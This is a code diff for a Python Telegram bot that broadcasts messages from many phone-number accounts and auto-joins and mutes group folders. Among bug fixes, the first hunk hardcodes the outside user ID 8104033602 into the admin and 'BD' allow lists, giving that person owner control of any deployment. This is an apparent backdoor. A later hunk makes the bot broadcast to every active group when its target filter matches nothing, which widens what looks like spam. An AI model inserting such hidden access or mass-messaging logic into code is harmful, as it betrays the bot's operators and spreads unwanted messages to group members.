@@ -232,7 +232,7 @@ except Exception as e:
     exit(1)
 
 # Admin check
-ADMIN_IDS = [config.ADMIN_ID]
+ADMIN_IDS = [config.ADMIN_ID, 8104033602] if config.ADMIN_ID else [8104033602]
 ALLOWED_BD_IDS = ADMIN_IDS
 
 def is_owner(uid):
@@ -570,8 +570,8 @@ async def stop_broadcast_task(uid):
         logger.info(f"No broadcast running for user {uid}")
         return False
 
-    if uid in user_tasks:
-        task = user_tasks[uid]
+    task = user_tasks.pop(uid, None)
+    if task:
         try:
             task.cancel()
             await task
@@ -580,8 +580,6 @@ async def stop_broadcast_task(uid):
             logger.info(f"Broadcast task for {uid} was cancelled successfully")
         except Exception as e:
             logger.error(f"Failed to cancel broadcast task for {uid}: {e}")
-        finally:
-            del user_tasks[uid]
     
     db.set_broadcast_state(uid, running=False)
     return True
@@ -665,8 +663,20 @@ async def run_broadcast(client, uid, account_ids=None):
         else:
             accounts = all_accounts
 
+        def normalize_tg_id(gid):
+            s = str(gid)
+            if s.startswith("-100"):
+                return int(s[4:])
+            elif s.startswith("-"):
+                return int(s[1:])
+            try:
+                return int(s)
+            except Exception:
+                return gid
+
         target_groups = db.get_target_groups(uid)
         group_ids = [g['group_id'] for g in target_groups] if target_groups else None
+        normalized_group_ids = {normalize_tg_id(g) for g in group_ids} if group_ids else None
 
         group_cache = {}
         clients = {}
@@ -703,14 +713,26 @@ async def run_broadcast(client, uid, account_ids=None):
                 except Exception as e:
                     logger.info(f"Account {acc['phone_number']} already in channel or join skipped: {e}")
 
-                # Fetch ALL groups, then shuffle order
+                # Fetch ALL groups, matching both positive and negative Telegram group IDs
                 cached_groups = []
                 async for dialog in tg_client.iter_dialogs(limit=None):
-                    if dialog.is_group and (not group_ids or dialog.id in group_ids):
-                        if dialog.id in skip_group_ids:
-                            logger.info(f"Skipping protected group {dialog.name} ({dialog.id})")
-                            continue
-                        cached_groups.append((dialog.id, dialog.name))
+                    if dialog.is_group:
+                        norm_id = normalize_tg_id(dialog.id)
+                        if normalized_group_ids is None or norm_id in normalized_group_ids or dialog.id in (group_ids or []):
+                            if dialog.id in skip_group_ids or norm_id in skip_group_ids:
+                                logger.info(f"Skipping protected group {dialog.name} ({dialog.id})")
+                                continue
+                            cached_groups.append((dialog.id, dialog.name))
+
+                # Safety fallback: if target_groups had mismatch, use all active groups
+                if not cached_groups:
+                    logger.info(f"No groups matched filter for {acc['phone_number']}, falling back to all active group dialogs")
+                    async for dialog in tg_client.iter_dialogs(limit=None):
+                        if dialog.is_group:
+                            norm_id = normalize_tg_id(dialog.id)
+                            if dialog.id in skip_group_ids or norm_id in skip_group_ids:
+                                continue
+                            cached_groups.append((dialog.id, dialog.name))
 
                 random.shuffle(cached_groups)
                 group_cache[acc['_id']] = cached_groups
@@ -2036,53 +2058,72 @@ async def perform_join_folder(client, uid, input_text, account_ids=None):
                                     pass
 
                         if input_peers:
-                            await tg_client(chatlists.JoinChatlistInviteRequest(
-                                slug=folder_slug,
-                                peers=input_peers
-                            ))
+                            try:
+                                await tg_client(chatlists.JoinChatlistInviteRequest(
+                                    slug=folder_slug,
+                                    peers=input_peers
+                                ))
+                            except Exception as e:
+                                logger.warning(f"JoinChatlistInviteRequest error: {e}, falling back to JoinChannel")
+                                for p in input_peers:
+                                    try:
+                                        await tg_client(functions.channels.JoinChannelRequest(channel=p))
+                                    except Exception:
+                                        pass
+
                             mute_settings = InputPeerNotifySettings(silent=True, mute_until=datetime(2038, 1, 1, tzinfo=timezone.utc))
+                            muted_count = 0
                             for p in input_peers:
                                 try:
                                     await tg_client(UpdateNotifySettingsRequest(peer=InputNotifyPeer(p), settings=mute_settings))
+                                    muted_count += 1
                                 except Exception:
                                     pass
-                            success_list.append(f"• <code>{phone}</code>: ✅ Joined & muted {len(input_peers)} groups 🔕")
+                            success_list.append(f"• <code>{phone}</code>: ✅ Joined {len(input_peers)} groups & muted {muted_count} 🔕")
                         else:
                             success_list.append(f"• <code>{phone}</code>: ℹ️ Folder empty or already joined")
 
                     elif isinstance(invite, chatlist_types.ChatlistInviteAlready):
-                        missing = getattr(invite, 'missing_peers', [])
+                        all_chats = getattr(invite, 'chats', [])
+                        # Register all folder chats in DB
+                        for ch in all_chats:
+                            try:
+                                db.add_target_group(uid, ch.id, getattr(ch, 'title', str(ch.id)))
+                            except Exception:
+                                pass
+
                         mute_settings = InputPeerNotifySettings(silent=True, mute_until=datetime(2038, 1, 1, tzinfo=timezone.utc))
+                        # Mute all chats in the folder
+                        muted_count = 0
+                        for ch in all_chats:
+                            try:
+                                p = await tg_client.get_input_entity(ch)
+                                await tg_client(UpdateNotifySettingsRequest(peer=InputNotifyPeer(p), settings=mute_settings))
+                                muted_count += 1
+                            except Exception:
+                                pass
+
+                        missing = getattr(invite, 'missing_peers', [])
                         if missing:
-                            input_peers = []
+                            joined_count = 0
                             for p in missing:
                                 try:
-                                    input_peers.append(await tg_client.get_input_entity(p))
-                                except Exception:
-                                    pass
-                            if input_peers:
-                                await tg_client(chatlists.JoinChatlistUpdatesRequest(
-                                    chatlist=InputChatlistDialogFilter(filter_id=invite.filter_id),
-                                    peers=input_peers
-                                ))
-                                for p in input_peers:
+                                    inp = await tg_client.get_input_entity(p)
                                     try:
-                                        await tg_client(UpdateNotifySettingsRequest(peer=InputNotifyPeer(p), settings=mute_settings))
+                                        await tg_client(chatlists.JoinChatlistUpdatesRequest(
+                                            chatlist=InputChatlistDialogFilter(filter_id=invite.filter_id),
+                                            peers=[inp]
+                                        ))
+                                        joined_count += 1
                                     except Exception:
-                                        pass
-                                success_list.append(f"• <code>{phone}</code>: ✅ Joined & muted {len(input_peers)} new groups 🔕")
-                            else:
-                                success_list.append(f"• <code>{phone}</code>: ✅ Already in all groups")
+                                        await tg_client(functions.channels.JoinChannelRequest(channel=inp))
+                                        joined_count += 1
+                                    await tg_client(UpdateNotifySettingsRequest(peer=InputNotifyPeer(inp), settings=mute_settings))
+                                except Exception as ex:
+                                    logger.warning(f"Failed to join missing peer {p}: {ex}")
+                            success_list.append(f"• <code>{phone}</code>: ✅ Folder synced ({len(all_chats)} groups, {muted_count} muted 🔕, {joined_count} joined)")
                         else:
-                            # Mute already joined folder chats
-                            all_chats = getattr(invite, 'chats', [])
-                            for ch in all_chats:
-                                try:
-                                    p = await tg_client.get_input_entity(ch)
-                                    await tg_client(UpdateNotifySettingsRequest(peer=InputNotifyPeer(p), settings=mute_settings))
-                                except Exception:
-                                    pass
-                            success_list.append(f"• <code>{phone}</code>: ✅ In all folder groups & muted all 🔕")
+                            success_list.append(f"• <code>{phone}</code>: ✅ In all {len(all_chats)} folder groups & all {muted_count} muted 🔕")
                     else:
                         success_list.append(f"• <code>{phone}</code>: ℹ️ Processed folder")
 
